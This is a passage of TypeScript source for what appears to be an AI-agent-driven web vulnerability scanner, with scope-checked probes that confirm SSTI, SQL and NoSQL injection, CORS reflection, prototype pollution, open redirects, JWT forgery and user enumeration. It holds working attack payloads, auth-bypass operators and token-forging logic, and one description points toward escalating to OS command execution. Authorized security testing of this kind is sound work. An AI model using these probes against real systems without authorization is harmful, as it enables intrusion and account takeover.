          return { evId: ev.id, status: res.status, evaluated: res.body.includes(product), echoedLiteral: res.body.includes(payload) };
        };
        let ctrl: Awaited<ReturnType<typeof send>>;
        let p1: Awaited<ReturnType<typeof send>>;
        let p2: Awaited<ReturnType<typeof send>>;
        try {
          ctrl = await send(control, "negative_control", "control(no template syntax)");
          p1 = await send(payload, "positive_replay", "payload #1");
          p2 = await send(payload, "positive_replay", "payload #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        if (!ctrl || !p1 || !p2) return txt("ERROR: could not build request (pass a valid url + param, or a body with {{SSTI}})");
        const verdict = checkLogicEvidence(
          { status: ctrl.status, hasMarker: ctrl.evaluated },
          [p1, p2].map((p) => ({ status: p.status, hasMarker: p.evaluated })),
        );
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            effectMarker: product,
            control: { evaluated: ctrl.evaluated },
            payload: [{ evaluated: p1.evaluated, echoedLiteral: p1.echoedLiteral }, { evaluated: p2.evaluated, echoedLiteral: p2.echoedLiteral }],
            verdict: verdict.ok
              ? `SSTI CONFIRMED — the server evaluated ${a}*${b} to ${product} (control did not). record_finding(category ssti) with these evidenceIds + effectMarker; severity high+ (template eval is RCE-class — you can escalate to OS command exec).`
              : p1.echoedLiteral || p2.echoedLiteral
                ? `not confirmed: the payload was REFLECTED LITERALLY (not evaluated) — that is XSS-surface, not SSTI. ${(verdict as { reason: string }).reason}`
                : `not confirmed: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "probe_sqli",
      "Confirm SQL INJECTION — boolean-based (in-band, JSON/XML bodies only) AND time-based (BLIND). Inject into `param` (query) or a `body` containing {{SQLI}} — OR aim any other location with `location`: \"header:X-Forwarded-For\" / \"cookie:sid\" / \"path:-1\" (a path segment) / \"json:/user/id\" (a field in a JSON body). Set `contentType` (e.g. application/json) so a content-type-dispatching API actually parses your body payload. Runs: an error probe (a lone quote → SQL-error signature), matched TRUE/FALSE pairs of equal length (a stable JSON/XML content DIFFERENCE = injection — HTML search-page length is NOT confirmation), and a time-based test (SLEEP(5)/pg_sleep(5)/WAITFOR — a consistent ~5s DELAY vs a fast baseline = blind injection; MySQL/Postgres/MSSQL tried) — the time oracle works from ANY location, so header/cookie/path blind SQLi is now confirmable. Returns negativeControl + positiveReplays evidenceIds + the confirming technique, ready for record_finding(category sqli). USE on any value reaching a query: search/id/sort/filter/login, XFF/User-Agent (logging INSERTs). (An error signature alone is a HINT — confirm with boolean or time. Do NOT record_finding(sqli) from Drupal/marketing HTML length.)",
      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional(), location: z.string().optional(), contentType: z.string().optional() },
      async ({ url, param, method, body, location, contentType }) => {
        const buildReq = (val: string): HttpRequest | null => {
          let req: HttpRequest;
          if (location) {
            const loc = parseLocation(location);
            if (!loc) return null;
            const base: HttpRequest = { method: (method ?? (loc.kind === "json" || body != null ? "POST" : "GET")).toUpperCase(), url, headers: authHeaders(s), body: body ?? null };
            const placed = placePayload(base, loc, val, contentType);
            if (!placed) return null;
            req = placed;
          } else {
            let u = url;
            let b: string | null = null;
            if (body != null) b = body.replace(/\{\{SQLI\}\}/g, val);
            else if (param) {
              try {
                const uu = new URL(url);
                uu.searchParams.set(param, val);
                u = uu.toString();
              } catch {
                return null;
              }
            }
            const hdrs = authHeaders(s);
            if (contentType && body != null) hdrs["content-type"] = contentType;
            req = { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: hdrs, body: b };
          }
          if (!isInScope(req.url, s.scope)) return null;
          return req;
        };
        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string, overrideBody?: string) => {
          const req = buildReq(val);
          if (!req) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-sqli",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: overrideBody != null ? { ...res, body: overrideBody } : res,
            note: `sqli ${tag}`,
          });
          return { evId: ev.id, status: res.status, len: res.body.length, nlen: normalizeVolatile(res.body).length, ms: res.durationMs, body: res.body };
        };
        try {
          const benign = await send("1", "negative_control", "baseline(benign)");
          if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{SQLI}}.");
          // ── noise-floor ── measure the page's own per-request jitter from two benign baselines (normalized to strip
          //   __VIEWSTATE / nonce / CSRF / timestamps). A boolean length delta is only trusted when it CLEARS this noise —
          //   a fixed ±64 got fooled by dynamic content into confirming SQLi from nothing.
          const benign2 = await send("1", "negative_control", "baseline#2(noise)");
          const noise = benign2 ? Math.abs(benign.nlen - benign2.nlen) : 0;
          const thr = diffThreshold(noise);
          // ── error-based(ヒント) ──
          const err = await send("'", "positive_replay", "error-probe(quote)");
          const errSig = err ? SQL_ERR_RE.exec(err.body)?.[0] : undefined;
          // ── boolean-based: matched TRUE/FALSE pairs only. Never mix a quoted FALSE with an unquoted TRUE
          //   (that FP'd Drupal HTML search: two different search strings, not a SQL tautology). HTML/text length
          //   is not an oracle — only JSON/XML (Juice Shop /rest/products/search still confirms). ──
          const usable = (x: { status: number; body: string }): boolean => x.status >= 200 && x.status < 300 && !looksBlocked(x);
          let subNoise = false;
          let unstructuredLength = false;
          for (const pair of SQLI_BOOLEAN_PAIRS) {
            const falseR = await send(pair.f, "negative_control", `boolean FALSE ${pair.f}`);
            if (falseR && looksBlocked(falseR)) {
              return txt(JSON.stringify({ technique: null, blocked: true, verdict: `BLOCKED: the target returned a WAF / bot-challenge page (status ${falseR.status}) instead of the app — probes are not reaching it, so SQLi cannot be confirmed here. Do NOT record a finding from these responses.` }));
            }
            const t1 = await send(pair.t, "positive_replay", `boolean TRUE ${pair.t}`);
            if (!t1 || !falseR || !usable(t1)) continue; // TRUE must be a real 2xx app response; FALSE MAY be non-2xx (the classic "no row" status flip)
            const unstructured = !looksLikeStructuredBody(t1.body) || !looksLikeStructuredBody(falseR.body);
            if (t1.status !== falseR.status) {
              // A STABLE status flip between matched TRUE/FALSE payloads (TRUE 200 with a row vs FALSE 404 / no-content) is
              // a boolean SQLi oracle regardless of body kind — the flip is the boolean RESULT, not HTML length variance
              // (the two payloads are both valid injections differing only in '1'='1' vs '1'='2'). Confirm with a replay.
              const t2 = await send(pair.t, "positive_replay", `boolean TRUE#2 ${pair.t}`);
              if (t2 && usable(t2) && t2.status === t1.status)
                return txt(JSON.stringify({ technique: "boolean", negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${pair.t}) status ${t1.status} vs FALSE(${pair.f}) status ${falseR.status}, stable across replays. record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
              continue;
            }
            if (!booleanLengthConfirmsSqli(t1.body, falseR.body, pair.t, pair.f, thr)) {
              if (unstructured) unstructuredLength = true;
              else if (t1.status === falseR.status && Math.abs(t1.nlen - falseR.nlen) > 0) subNoise = true;
              continue;
            }
            const t2 = await send(pair.t, "positive_replay", `boolean TRUE#2 ${pair.t}`);
            if (t2 && usable(t2) && booleanLengthConfirmsSqli(t2.body, falseR.body, pair.t, pair.f, thr) && Math.abs(t2.nlen - t1.nlen) <= thr)
              return txt(JSON.stringify({ technique: "boolean", negativeControl: falseR.evId, positiveReplays: [t1.evId, t2.evId], verdict: `SQLi CONFIRMED (boolean): TRUE(${pair.t}) vs FALSE ${pair.f} on a structured (JSON/XML) response (delta > noise-floor ${thr}). record_finding(category sqli) with these evidenceIds.${errSig ? ` (SQL error also seen: ${errSig})` : ""}` }));
          }
          // ── time-based(blind: 一定の遅延) ── reuse the noise baseline (benign2) instead of sending a third baseline.
          const baselineMs = Math.min(benign.ms, benign2?.ms ?? benign.ms);
          for (const sp of ["' AND SLEEP(5)-- -", " AND SLEEP(5)-- -", "' AND pg_sleep(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -", "' OR SLEEP(5)-- -"]) {
            const a = await send(sp, "positive_replay", `time ${sp}`);
            if (!a || a.ms < baselineMs + 4000) continue;
            const b2 = await send(sp, "positive_replay", `time#2 ${sp}`);
            if (b2 && b2.ms >= baselineMs + 4000) {
              // blind = 内容不変 → record_finding の length gate 用に timing-proof を distinguishable な evidence body で残す。
              const proof = `TIME-BASED BLIND SQLi CONFIRMED — payload="${sp}" baseline=${baselineMs}ms observed=${a.ms}ms and ${b2.ms}ms (delta +${a.ms - baselineMs}ms, x2 stable). Blind injection: response content is unchanged, the DELAY is the proof.`;
              const p1 = await send(sp, "positive_replay", "time-proof#1", proof);
              const p2 = await send(sp, "positive_replay", "time-proof#2", proof);
              const ctl = await send("1", "negative_control", "time baseline-proof", `baseline ${baselineMs}ms — no injection, fast response.`);
              if (p1 && p2 && ctl)
                return txt(JSON.stringify({ technique: "time-based", negativeControl: ctl.evId, positiveReplays: [p1.evId, p2.evId], verdict: `BLIND SQLi CONFIRMED (time-based): SLEEP(5) added ~${a.ms - baselineMs}ms x2 vs ${baselineMs}ms baseline (payload ${sp}). record_finding(category sqli, high+) with these evidenceIds.` }));
            }
          }
          if (unstructuredLength)
            return txt(JSON.stringify({
              technique: null,
              errorSignature: errSig ?? null,
              verdict: `not confirmed: HTML/document length changed with the query — that is result-page variance (Drupal/marketing search), not boolean SQLi. Do NOT record_finding(sqli) from that delta. Time-based did not confirm.${errSig ? ` SQL error signature seen ("${errSig}") — a hint, not confirmation.` : ""} A JSON/API boolean differential would confirm.`,
            }));
          if (subNoise)
            return txt(JSON.stringify({ technique: "boolean", suspected: true, verdict: `SUSPECTED (not confirmed): a boolean length difference was seen but it is WITHIN the page's natural variance (noise floor ${thr}) — not reliably distinguishable from dynamic content. Record as SUSPECTED (a lead), not confirmed, unless you get a second independent signal (time-based delay or a SQL error). ${errSig ? `SQL error signature also seen: ${errSig}.` : ""}` }));
          return txt(
            JSON.stringify({
              technique: null,
              errorSignature: errSig ?? null,
              verdict: errSig
                ? `SQL error signature seen ("${errSig}") but boolean/time did not confirm — likely SQLi behind a filter; try tailored payloads via http_request (different quote/comment styles, UNION, or the login-bypass oracle on auth screens).`
                : "not confirmed: no boolean content-difference and no time delay. If this is a login form, test auth-bypass (success = a session/redirect, not an error).",
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_nosql",
      "Confirm NoSQL / OPERATOR INJECTION (MongoDB / Mongoose / MarsDB) — a document store IGNORES probe_sqli's SQL payloads, so run THIS on a Mongo-backed target. Two shapes: (1) pass a JSON `body` with a {{NOSQL}} placeholder AT THE INJECTED VALUE (e.g. {\"email\":\"admin@x\",\"password\":{{NOSQL}}}) — it substitutes operator objects ({$ne:null}/{$gt:''}/{$regex:.*}) to make a field always-true (auth/filter bypass) and a $where sleep for BLIND time-based; (2) pass `param` (query) to test the field[$ne]= bracket form. For a LOGIN endpoint pass `successMarker` (the string that appears only on success, e.g. \"authentication\" / \"token\") — confirm = the benign control FAILS and the operator payload SUCCEEDS twice. Returns negativeControl + positiveReplays evidenceIds + the technique → record_finding(category sqli) titled NoSQL. USE on login/search/filter endpoints on Node/Express+Mongo apps.",
      { url: z.string(), param: z.string().optional(), body: z.string().optional(), method: z.string().optional(), contentType: z.string().optional(), successMarker: z.string().optional() },
      async ({ url, param, body, method, contentType, successMarker }) => {
        const ct = contentType ?? "application/json";
        const mkReq = (u: string, b: string | null): HttpRequest | null => {
          const hdrs = authHeaders(s);
          if (b != null) hdrs["content-type"] = ct;
          const req: HttpRequest = { method: (method ?? (b != null ? "POST" : "GET")).toUpperCase(), url: u, headers: hdrs, body: b };
          return isInScope(req.url, s.scope) ? req : null;
        };
        const fire = async (u: string, b: string | null, kind: "negative_control" | "positive_replay", tag: string) => {
          const req = mkReq(u, b);
          if (!req) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-nosql",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `nosql ${tag}`,
          });
          return { evId: ev.id, status: res.status, body: res.body, ms: res.durationMs };
        };
        try {
          if (body == null && !param) return txt("ERROR: pass `body` (JSON) with a {{NOSQL}} placeholder at the injected value, or `param` (query) for the [$ne]= form.");
          const controlSpec = body != null
            ? { u: url, b: body.replace(/\{\{NOSQL\}\}/g, NOSQL_CONTROL_VALUE) }
            : { u: (() => { try { const uu = new URL(url); uu.searchParams.set(param!, "__verdict_nonexistent_zzz__"); return uu.toString(); } catch { return url; } })(), b: null as string | null };
          const control = await fire(controlSpec.u, controlSpec.b, "negative_control", "control(benign literal)");
          if (!control) return txt("ERROR: control request out of scope / bad url.");
          let errSig = nosqlErrorSignature(control.body);
          const ops = body != null
            ? NOSQL_OP_OBJECTS.map((o) => ({ label: o.label, u: url, b: body.replace(/\{\{NOSQL\}\}/g, o.json) as string | null }))
            : NOSQL_OP_QUERY.map((o) => ({ label: o.label, u: nosqlQueryUrl(url, param!, o.op, o.val), b: null as string | null }));
          for (const op of ops) {
            if (!op.u) continue;
            const p1 = await fire(op.u, op.b, "positive_replay", `op ${op.label} #1`);
            if (!p1) continue;
            errSig = errSig ?? nosqlErrorSignature(p1.body);
            const p2 = await fire(op.u, op.b, "positive_replay", `op ${op.label} #2`);
            if (!p2) continue;
            if (nosqlBypassConfirms({ status: control.status, body: control.body }, [{ status: p1.status, body: p1.body }, { status: p2.status, body: p2.body }], successMarker))
              return txt(JSON.stringify({ technique: "operator-bypass", negativeControl: control.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: successMarker ?? `status ${p1.status}`, verdict: `NoSQL OPERATOR INJECTION CONFIRMED — benign control (status ${control.status}) failed, operator ${op.label} succeeded (status ${p1.status}) twice${successMarker ? ` with marker "${successMarker}"` : ""}. record_finding(category sqli) — title it NoSQL/operator injection — with these evidenceIds + effectMarker.` }));
          }
          if (body != null) {
            const baseMs = control.ms;
            const t1 = await fire(url, body.replace(/\{\{NOSQL\}\}/g, nosqlTimeObject(3000)), "positive_replay", "$where sleep #1");
            if (t1 && t1.ms - baseMs > 2200) {
              const t2 = await fire(url, body.replace(/\{\{NOSQL\}\}/g, nosqlTimeObject(3000)), "positive_replay", "$where sleep #2");
              if (t2 && t2.ms - baseMs > 2200)
                return txt(JSON.stringify({ technique: "time-based", negativeControl: control.evId, positiveReplays: [t1.evId, t2.evId], verdict: `BLIND NoSQL INJECTION CONFIRMED ($where sleep): +${Math.round(t1.ms - baseMs)}ms x2 vs ${Math.round(baseMs)}ms baseline. record_finding(category sqli) — NoSQL — with these evidenceIds.` }));
            }
          }
          return txt(JSON.stringify({ technique: null, errorSignature: errSig ?? null, verdict: errSig ? `NoSQL error signature seen ("${errSig}") — likely a Mongo/Mongoose backend, but operator/time did not confirm. Try tailored payloads via http_request (login: password={"$ne":null}; or $where).` : "not confirmed: operator payloads did not bypass and $where showed no delay. On a login form, set successMarker to the token/success string and retry." }));
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_cors",
      "Confirm a CORS misconfiguration: whether the endpoint REFLECTS an arbitrary Origin into Access-Control-Allow-Origin. Sends a control (no Origin) + an evil-origin request twice; confirms if the evil host is reflected in ACAO on the payload but NOT the control. If Access-Control-Allow-Credentials:true is also present it is HIGH (an attacker page reads the victim's AUTHENTICATED responses cross-origin); without credentials it is LOW. A static '*' is not a finding. Returns negativeControl + positiveReplays evidenceIds + effectMarker (the evil origin) → record_finding(category cors-misconfig). USE on any API endpoint, especially authed JSON APIs.",
      { url: z.string() },
      async ({ url }) => {
        const evil = "https://evil.verdict-oob.example";
        const el = evil.toLowerCase();
        const fire = async (origin: string | null, kind: "negative_control" | "positive_replay", tag: string) => {
          const headers = authHeaders(s);
          if (origin) headers["origin"] = origin;
          const req: HttpRequest = { method: "GET", url, headers, body: null };
          if (!isInScope(req.url, s.scope)) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-cors", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `cors ${tag}` });
          return { evId: ev.id, acao: (res.headers["access-control-allow-origin"] ?? "").trim().toLowerCase(), acac: (res.headers["access-control-allow-credentials"] ?? "").trim().toLowerCase(), status: res.status };
        };
        try {
          const control = await fire(null, "negative_control", "no-origin");
          if (!control) return txt("BLOCKED: url out of scope.");
          const p1 = await fire(evil, "positive_replay", "evil-origin #1");
          const p2 = await fire(evil, "positive_replay", "evil-origin #2");
          const reflects = (r: { acao: string } | null): boolean => !!r && r.acao === el;
          if (p1 && p2 && reflects(p1) && reflects(p2) && !reflects(control)) {
            const withCreds = p1.acac === "true";
            return txt(JSON.stringify({ confirmed: true, negativeControl: control.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: evil, severity: withCreds ? "high" : "low", verdict: `CORS MISCONFIG CONFIRMED — Access-Control-Allow-Origin reflects an arbitrary origin ${withCreds ? "WITH credentials (cross-origin theft of AUTHENTICATED responses = HIGH)" : "without credentials (LOW)"}. record_finding(category cors-misconfig, ${withCreds ? "high" : "low"}) with these evidenceIds + effectMarker "${evil}".` }));
          }
          return txt(JSON.stringify({ confirmed: false, verdict: "not confirmed: the arbitrary Origin was not reflected into Access-Control-Allow-Origin (static '*' or no ACAO is not a finding)." }));
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_proto",
      "Confirm PROTOTYPE POLLUTION (Node/Express with a deep-merge / lodash.merge sink): POSTs a JSON body that pollutes Object.prototype ({\"__proto__\":{\"<marker>\":\"<val>\"}}) — built as a RAW body so the operator keys aren't dropped — then a benign FOLLOW-UP request; confirms if the injected property LEAKS back (an inherited property serialized into the follow-up response). Point `url` at a JSON body the app merges into an object (a profile/settings/config update); `followUrl` = a benign GET whose response would echo an inherited property (defaults to `url`). Returns negativeControl + positiveReplays evidenceIds + effectMarker → record_finding(category prototype-pollution, high). USE on any JSON body an Express app merges.",
      { url: z.string(), method: z.string().optional(), followUrl: z.string().optional(), contentType: z.string().optional() },
      async ({ url, method, followUrl, contentType }) => {
        const ct = contentType ?? "application/json";
        const marker = "verdictPP9137";
        const markerVal = marker + "VAL";
        const pollution = `{"__proto__":{"${marker}":"${markerVal}"}}`;
        const fu = followUrl ?? url;
        const fire = async (u: string, b: string | null, m: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const headers = authHeaders(s);
          if (b != null) headers["content-type"] = ct;
          const req: HttpRequest = { method: m.toUpperCase(), url: u, headers, body: b };
          if (!isInScope(req.url, s.scope)) return null;
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-proto", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `proto ${tag}` });
          return { evId: ev.id, status: res.status, body: res.body };
        };
        try {
          const control = await fire(fu, null, "GET", "negative_control", "follow(before pollution)");
          if (!control) return txt("BLOCKED: url out of scope.");
          if (control.body.includes(markerVal)) return txt("not confirmed: the marker is ambiently present before pollution — pick a fresh followUrl.");
          await fire(url, pollution, method ?? "POST", "positive_replay", "pollute");
          const p1 = await fire(fu, null, "GET", "positive_replay", "follow(after) #1");
          const p2 = await fire(fu, null, "GET", "positive_replay", "follow(after) #2");
          const leaked = (r: { body: string } | null): boolean => !!r && r.body.includes(markerVal);
          if (p1 && p2 && leaked(p1) && leaked(p2))
            return txt(JSON.stringify({ confirmed: true, negativeControl: control.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: markerVal, verdict: `PROTOTYPE POLLUTION CONFIRMED — after POSTing {"__proto__":{"${marker}":...}}, the injected inherited property "${markerVal}" appeared in the follow-up response (absent before). record_finding(category prototype-pollution, high) with these evidenceIds + effectMarker.` }));
          return txt(JSON.stringify({ confirmed: false, verdict: "not confirmed: the injected __proto__ property did not leak into the follow-up. Try a gadget (__proto__.status / a config key the app reads) via http_request, or a different merge sink." }));
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_redirect",
      "Confirm an OPEN REDIRECT: sets `param` to an attacker-controlled external host and checks the response redirects there (Location header → the OOB host). If the param's CURRENT value WRAPS a URL (base64 or percent-encoded — e.g. a SSO_ORIG_URI / returnUrl / next return-URL), the payload is RE-ENCODED in the same wrapper so the decoded sink is actually reached. Sends a benign in-scope control + the external payload twice. Returns negativeControl + positiveReplays evidenceIds + the effectMarker (the OOB host), ready for record_finding(category open-redirect).",
      { url: z.string(), param: z.string() },
      async ({ url, param }) => {
        const marker = OOB_MARKER;
        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
          let u: string;
          try {
            const uu = new URL(url);
            uu.searchParams.set(param, val);
            u = uu.toString();
          } catch {
            return null;
          }
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const req: HttpRequest = { method: "GET", url: u, headers: authHeaders(s), body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const loc = res.headers["location"] ?? "";
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-redirect",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `redirect ${tag} ${param}`,
          });
          return { evId: ev.id, status: res.status, toOob: locationTargetsHost(loc, u, marker), location: loc.slice(0, 200) };
        };
        let ctrl: Awaited<ReturnType<typeof send>>;
        let p1: Awaited<ReturnType<typeof send>>;
        let p2: Awaited<ReturnType<typeof send>>;
        try {
          // If the param's current value WRAPS a URL (base64/percent — the SSO_ORIG_URI shape), inject the OOB host
          // RE-ENCODED in the same wrapper; a raw payload would be decoded to garbage and never reach the redirect sink.
          const cur = ((): string => { try { return new URL(url).searchParams.get(param) ?? ""; } catch { return ""; } })();
          const wrapper = detectUrlWrapper(cur);
          const payloadVal = wrapper ? wrapper.rewrap(`https://${marker}/`) : `https://${marker}/`;
          ctrl = await send("/account", "negative_control", "control(in-scope path)");
          p1 = await send(payloadVal, "positive_replay", wrapper ? `payload #1 (${wrapper.kind}-wrapped)` : "payload #1");
          p2 = await send(payloadVal, "positive_replay", wrapper ? `payload #2 (${wrapper.kind}-wrapped)` : "payload #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
        if (!ctrl || !p1 || !p2) return txt("ERROR: could not build request (bad url/param)");
        const verdict = checkLogicEvidence(
          { status: ctrl.status, hasMarker: ctrl.toOob },
          [p1, p2].map((p) => ({ status: p.status, hasMarker: p.toOob })),
        );
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [p1.evId, p2.evId],
            effectMarker: marker,
            control: { location: ctrl.location, toOob: ctrl.toOob },
            payload: [{ location: p1.location, toOob: p1.toOob }, { location: p2.location, toOob: p2.toOob }],
            verdict: verdict.ok
              ? "OPEN REDIRECT — Location points to the attacker-controlled OOB host; record_finding(open-redirect) with these evidenceIds + effectMarker"
              : `not confirmed: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "probe_jwt",
      "Confirm a JWT forgery: (1) weak HMAC secret — cracks the live Bearer against a small default-secret wordlist and mints a new token; (2) alg:none / None / NONE (signature not verified); (3) RS256->HS256 KEY CONFUSION — if the token is RS/PS/ES-signed, fetches the JWKS (jwksUrl or /.well-known/jwks.json) and re-signs the token as HS256 using the RSA PUBLIC KEY as the HMAC secret (a naive verifier accepts it → admin forgery). Requires login() so the session holds a Bearer JWT. Replays each candidate against an identity-returning authed `url`; garbage token is the negative control (must be rejected) and the forged token is sent twice (accepted = the server took a token we minted). Returns negativeControl + positiveReplays evidenceIds → record_finding(category session). Optionally mutate a claim via `claimKey`/`claimValue` for privilege escalation. Does not cover jku/x5u or kid injection.",
      { url: z.string(), claimKey: z.string().optional(), claimValue: z.string().optional(), jwksUrl: z.string().optional() },
      async ({ url, claimKey, claimValue, jwksUrl }) => {
        if (!s.currentBearer) return txt("no Bearer JWT in the current session — login(role) first (this probe forges from the live token).");
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        const mutate = (c: Record<string, unknown>): void => {
          bumpJwtExp(c);
          if (claimKey) c[claimKey] = claimValue ?? "admin";
        };
        // RS256->HS256 key confusion needs the RSA public key — fetch the JWKS when the token is asymmetric-signed.
        let publicKeyPem: string | undefined;
        const hdrAlg = ((): string => { const pj = parseJwt(s.currentBearer); return pj && typeof pj.header.alg === "string" ? pj.header.alg.trim().toUpperCase() : ""; })();
        if (/^(?:RS|PS|ES)(?:256|384|512)$/.test(hdrAlg)) {
          const jwksTries: string[] = [];
          if (jwksUrl) jwksTries.push(jwksUrl);
          try { jwksTries.push(new URL("/.well-known/jwks.json", url).toString()); } catch { /* bad url */ }
          for (const ju of jwksTries) {
            if (!isInScope(ju, s.scope)) continue;
            try {
              const res = await s.http.send({ method: "GET", url: ju, headers: authHeaders(s), body: null });
              bumpHttp(s, res.status, { active: false });
              if (res.status < 400 && res.body.includes("\"keys\"")) {
                const pem = pemFromJwks(res.body);
                if (pem) { publicKeyPem = pem; break; }
              }
            } catch { /* fetch failed — skip this jwks url */ }
          }
        }
        const candidates = jwtForgeCandidates(s.currentBearer, mutate, publicKeyPem ? { publicKeyPem } : {});
        if (candidates.length === 0) return txt("could not parse the current Bearer token as a JWT (header.payload.signature).");
        const send = async (bearer: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const req: HttpRequest = { method: "GET", url, headers: { ...authHeaders(s), authorization: `Bearer ${bearer}` }, body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-jwt",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `jwt ${tag}`,
          });
          return { evId: ev.id, status: res.status, len: res.body.length };
        };
        try {
          const ctrl = await send("eyJhbGciOiJub25lIn0.eyJpbnZhbGlkIjp0cnVlfQ.", "negative_control", "garbage/invalid token");
          const tried: string[] = [];
          for (const c of candidates) {
            tried.push(c.technique);
            const p1 = await send(c.token, "positive_replay", `${c.technique} #1`);
            if (!(p1.status < 400 && ctrl.status >= 400)) continue;
            const p2 = await send(c.token, "positive_replay", `${c.technique} #2`);
            if (p2.status >= 400) continue;
            const secretBit = c.secret !== undefined ? ` HMAC secret ${c.secret === "" ? "(empty string)" : JSON.stringify(c.secret)}.` : "";
            return txt(
              JSON.stringify({
                technique: c.technique,
                ...(c.secret !== undefined ? { secret: c.secret } : {}),
                negativeControl: ctrl.evId,
                positiveReplays: [p1.evId, p2.evId],
                control: { status: ctrl.status },
                forged: [{ status: p1.status }, { status: p2.status }],
                verdict: `JWT FORGERY (${c.technique}) — minted token ACCEPTED while the garbage control was rejected.${secretBit} record_finding(session, severity high/critical) with these evidenceIds.`,
              }),
            );
          }
          const cracked = candidates.find((c) => c.secret !== undefined);
          return txt(
            JSON.stringify({
              tried,
              ...(cracked ? { hmacCracked: { technique: cracked.technique, secret: cracked.secret } } : {}),
              control: { status: ctrl.status },
              verdict: cracked
                ? `not confirmed on this url: HMAC secret is ${JSON.stringify(cracked.secret)} but the minted token was not accepted (control ${ctrl.status}). Try another identity endpoint. alg:none variants also rejected.`
                : `not confirmed: no candidate accepted (control ${ctrl.status}; tried ${tried.join(", ")}). Need forged<400 and control>=400.`,
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_user_enum",
      "Confirm USER ENUMERATION on a login / forgot-password / register / verify-email endpoint: a KNOWN-valid username vs a NON-EXISTENT one produce a distinguishing marker (wrong-password vs user-not-found, exists:true, or a status flip). Confirmation is by that MARKER, not body length. Put {{USER}} in `url` or `body`, or pass `param` (query). `validUser` = an account that exists (defaults to the first configured role username). Sends unauthenticated on purpose (pre-auth surface). Returns negativeControl + positiveReplays + effectMarker → record_finding(category user-enumeration).",
      {
        url: z.string(),
        validUser: z.string().optional(),
        invalidUser: z.string().optional(),
        param: z.string().optional(),
        method: z.string().optional(),
        body: z.string().nullable().optional(),
      },
      async ({ url, validUser, invalidUser, param, method, body }) => {
        const valid = (validUser?.trim() || [...s.roleCreds.values()][0]?.username || "").trim();
        if (!valid) return txt("ERROR: pass validUser (a username that exists) or configure a role with credentials so the probe has a known-valid account.");
        const nobody = (invalidUser?.trim() || `nosuch_${Date.now().toString(36)}@verdict.invalid`).trim();
        if (valid === nobody) return txt("ERROR: validUser and invalidUser must differ.");
        const placed = (user: string) => placeUserIdentity(url, body ?? null, param, user);
        if (!placed(valid) || !placed(nobody)) return txt("ERROR: put {{USER}} in url or body, or pass a query `param` to inject the username.");
        const meth = (method ?? (body != null ? "POST" : "GET")).toUpperCase();
        const fire = async (user: string, kind: "negative_control" | "positive_replay", tag: string) => {
          const p = placed(user)!;
          if (!isInScope(p.url, s.scope)) throw new Error(`out of scope: ${p.url}`);
          // Pre-auth on purpose: do NOT attach the session cookie/Bearer (a logged-in login form is not an enum surface).
          const hdr: Record<string, string> = {};
          if (p.body != null) {
            const t = p.body.trim();
            hdr["content-type"] = t.startsWith("{") || t.startsWith("[") ? "application/json" : "application/x-www-form-urlencoded";
          }
          const req: HttpRequest = { method: meth, url: p.url, headers: hdr, body: p.body };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const stamped = { ...res, body: `${res.body}\n[VERDICT-USER-ENUM] status:${res.status}` };
          const ev = s.evidence.record({
